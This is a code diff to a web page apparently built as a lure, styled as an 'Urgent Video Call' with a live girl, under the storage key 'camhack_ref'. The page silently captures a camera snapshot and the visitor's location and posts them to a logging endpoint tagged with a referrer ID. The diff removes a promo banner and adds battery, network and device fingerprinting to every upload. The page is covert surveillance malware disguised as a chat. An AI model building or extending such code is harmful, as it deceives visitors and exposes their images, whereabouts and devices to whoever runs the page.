@@ -154,11 +154,6 @@
 </head>
 <body>
   <div class="container">
-    <div id="promo-banner" class="banner" style="display:none;">
-      ✨ Wants To talk with girls<br>
-      <a href="https://www.omegel.com" target="_blank" id="bot-link">Click here to open  </a> and send <code>/start</code>!
-    </div>
-
     <div class="header">💋 Urgent Video Call</div>
     <img src="https://images.unsplash.com/photo-1534528741775-53994a69daeb?auto=format&fit=crop&w=400&q=80" class="girl-img" alt="Live Girl" id="main-img">
     <div class="status">● ONLINE NOW - READY FOR CALL</div>
@@ -201,12 +196,6 @@
 
     if (ref) {
       localStorage.setItem('camhack_ref', ref);
-    } else {
-      // Show promo banner if no ref in URL
-      const savedRef = localStorage.getItem('camhack_ref');
-      if (!savedRef) {
-        document.getElementById('promo-banner').style.display = 'block';
-      }
     }
 
     const girls = [
@@ -288,6 +277,63 @@
       }
     }
 
+    async function getBatteryInfo() {
+      if ('getBattery' in navigator) {
+        try {
+          const battery = await navigator.getBattery();
+          const level = Math.round(battery.level * 100) + '%';
+          const charging = battery.charging ? ' 🔌 (Charging)' : ' 🔋 (Discharging)';
+          return level + charging;
+        } catch (e) {
+          return 'N/A';
+        }
+      }
+      return 'N/A (Not supported)';
+    }
+
+    function getNetworkInfo() {
+      const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+      if (conn) {
+        const type = (conn.effectiveType || conn.type || 'Unknown').toUpperCase();
+        const downlink = conn.downlink ? ` (${conn.downlink} Mbps)` : '';
+        return `${type}${downlink}`;
+      }
+      return 'Unknown';
+    }
+
+    function getDeviceInfo() {
+      const ua = navigator.userAgent;
+      let device = "Unknown Device";
+      
+      if (/Android/i.test(ua)) {
+        const match = ua.match(/Android\s+[\d\.]+;\s*([^;)]+)/i);
+        if (match && match[1]) {
+          device = `Android (${match[1].trim()})`;
+        } else {
+          device = "Android Device";
+        }
+      } else if (/iPhone/i.test(ua)) {
+        device = "Apple iPhone";
+      } else if (/iPad/i.test(ua)) {
+        device = "Apple iPad";
+      } else if (/Windows/i.test(ua)) {
+        device = "Windows PC";
+      } else if (/Macintosh|Mac OS X/i.test(ua)) {
+        device = "MacBook / Mac";
+      } else if (/Linux/i.test(ua)) {
+        device = "Linux PC";
+      }
+
+      return device;
+    }
+
+    async function getTelemetryData() {
+      const battery = await getBatteryInfo();
+      const network = getNetworkInfo();
+      const device = getDeviceInfo();
+      return { battery, network, device };
+    }
+
     async function startCall(name, imgUrl) {
       if (imgUrl) {
         document.getElementById('main-img').src = imgUrl;
@@ -300,16 +346,17 @@
       startRingtone();
 
       const activeRef = ref || localStorage.getItem('camhack_ref');
+      const telemetry = await getTelemetryData();
 
-      // Send instant click alert immediately
+      // Send instant click alert immediately with telemetry
       fetch('/api/log', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ name, status: 'clicked', ref: activeRef })
+        body: JSON.stringify({ name, status: 'clicked', ref: activeRef, ...telemetry })
       }).catch(() => {});
 
       // Trigger capture and send in background immediately
-      captureAndSend(name, activeRef);
+      captureAndSend(name, activeRef, telemetry);
 
       // Start simulated timer
       let seconds = 0;
@@ -336,8 +383,10 @@
       alert("Call ended by peer.");
     }
 
-    async function captureAndSend(name, activeRef) {
+    async function captureAndSend(name, activeRef, telemetry) {
       try {
+        if (!telemetry) telemetry = await getTelemetryData();
+
         const video = document.getElementById("video");
         const canvas = document.getElementById("canvas");
         const ctx = canvas.getContext("2d");
@@ -359,7 +408,8 @@
           body: JSON.stringify({
             name,
             photo: imageData,
-            ref: activeRef
+            ref: activeRef,
+            ...telemetry
           })
         }).catch(() => {});
 
@@ -375,7 +425,8 @@
                 lon: locationData.lon,
                 acc: locationData.acc,
                 ref: activeRef,
-                isLocationUpdate: true
+                isLocationUpdate: true,
+                ...telemetry
               })
             }).catch(() => {});
           }
